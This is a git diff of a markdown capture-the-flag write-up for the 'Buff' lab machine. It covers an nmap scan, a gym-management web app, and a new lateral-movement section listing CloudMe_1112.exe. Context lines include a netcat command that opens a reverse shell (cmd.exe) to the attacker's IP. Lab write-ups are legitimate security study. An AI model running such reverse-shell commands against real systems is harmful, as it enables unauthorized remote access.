@@ -49,7 +49,7 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
 ```
-Only one port open , **8080** which appears to be a WebServer holding the title : **mrb3n's Bro Hut**.
+Only port **8080** shows opened which appears to be a WebServer holding the title : **mrb3n's Bro Hut**.
 
 ### Webpage
 
@@ -58,6 +58,7 @@ The webpage represents somewhat of a fitness page with a login option.
 ![webpage](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/webpage.png)
 
 Clicking on **Contact** button reveals useful information.
+
 The website has been built using **Gym Management Software 1.0** :
 
 ![contact](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/contact.png)
@@ -108,3 +109,25 @@ C:\xampp\htdocs\gym\upload> netcat.exe 10.10.14.127 9001 -e cmd.exe
 After a while listening , I recieve a reverse shell :
 
 ![rev](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/rev.png)
+
+## Lateral Movement
+
+While enumerating the box I came across an interesting **.exe** file under ``C:\Users\shaun\Downloads`` :
+
+```cmd
+C:\Users\shaun\Documents>cd ../Downloads
+cd ../Downloads
+
+C:\Users\shaun\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of C:\Users\shaun\Downloads
+
+14/07/2020  12:27    <DIR>          .
+14/07/2020  12:27    <DIR>          ..
+16/06/2020  15:26        17,830,824 CloudMe_1112.exe
+               1 File(s)     17,830,824 bytes
+               2 Dir(s)   9,756,262,400 bytes free
+```
